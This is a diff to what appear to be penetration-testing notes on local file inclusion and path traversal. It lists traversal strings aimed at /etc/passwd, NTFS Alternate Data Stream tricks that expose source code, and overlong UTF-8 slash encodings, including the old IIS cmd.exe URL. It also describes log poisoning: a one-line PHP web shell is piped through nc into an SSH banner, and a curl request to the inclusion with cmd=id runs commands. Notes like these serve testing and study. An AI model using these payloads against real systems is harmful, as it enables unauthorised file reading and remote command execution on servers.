@@ -18,30 +18,29 @@ index.php?page=../../../../../../var/www/dossierexistant/../../../../../etc/pass
 NULL byte in paths fixed
 
 # windows
-use Alternate Data Streams
+* use Alternate Data Streams (https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/)
 ../../test.txt:data.aspx
-type secret > test.txt:data.aspx
-type test.txt:data.aspx -> The filename syntax is incorrect
+echo secret > test.txt:data.aspx
 more < test.txt:data.aspx 
+type test.txt:data.aspx will print the "The filename, ... syntax is incorrect" error
 
-::$DATA to access the content of file (and not the ADS)
+::$DATA to access the content of the file (and not an ADS)
 show source code bypass: http://www.alternate-data-streams.com/default.asp::$DATA
 
+* use multibyte encodings
 null byte: %c0%80
 fwd slash: ../%c0%af (because %80 + %2f == %af)
 old school 2000: http ://www.myserver.com/scripts/..%c0%af../winnt/system32/cmd.exe?c+dir+c:\
-many other ways to encoded the forward-slash and backslah in unicode:
+many other ways to encode the forward-slash and backslah in unicode:
 %c0%af %c1%9c %c1%pc %c0%qf %c1%8s %c1%1c %c1%af %e0%80%af
 source: http://www.sans.org/reading-room/whitepapers/threats/unicode-vulnerability-why-458
 
 # logs
 /proc/self/fd/10
 access_log
-general logs via ssh client banner
-nc 10.0.0.1 22
-<? system($_GET["cmd"]);exit; ?>
-
-curl 10.0.0.1/test.php?page=/var/log/auth.log&cmd=id
+or other logs e.g. via ssh client banner:
+echo '<? system($_GET["cmd"]);exit; ?>' | nc 10.0.0.1 22
+then curl 10.0.0.1/test.php?page=/var/log/auth.log&cmd=id
 
 # if you can upload files or images
 insert php code in file
